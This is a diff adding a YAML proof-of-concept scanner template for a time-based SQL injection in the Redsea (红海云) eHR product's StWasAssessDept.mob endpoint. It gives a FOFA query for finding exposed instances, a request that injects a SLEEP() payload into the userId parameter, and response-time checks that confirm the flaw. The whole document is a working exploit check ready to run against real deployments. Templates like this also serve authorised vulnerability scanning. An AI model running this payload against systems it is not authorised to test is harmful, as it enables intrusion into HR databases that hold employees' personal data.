@@ -1,0 +1,21 @@
+id: poc-yaml-hr-soft-stwasassessdept-mob-sqli
+info:
+  name: 红海云eHR StWasAssessDept.mob SQL注入漏洞
+  severity: high
+  tags:
+  - SQL注入
+  finger: 红海云eHR
+  fofa: body="/RedseaPlatform/skins/images/favicon.ico"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /RedseaPlatform/
+  expression: status_code == 200 && contains(body,"/RedseaPlatform/skins/images/favicon.ico")
+- method: GET
+  path: /RedseaPlatform/submitStWasAssessDept/StWasAssessDept.mob?userId='+AND+(SELECT+3266+FROM+(SELECT(SLEEP({{.t1}})))ShXk)+AND+'qmyT'='qmyT
+  expression: "status_code == 200 && \ncontains(body,\"修改失败\") &&\ncontains(body,\"\
+    \\\"isRecord\\\":\") &&\ncontains(body,\"\\\"jsonList\\\":\") &&\n!contains(body,\"\
+    <\") &&\nduration > t1 &&\nduration < t2\n"
+transport: http
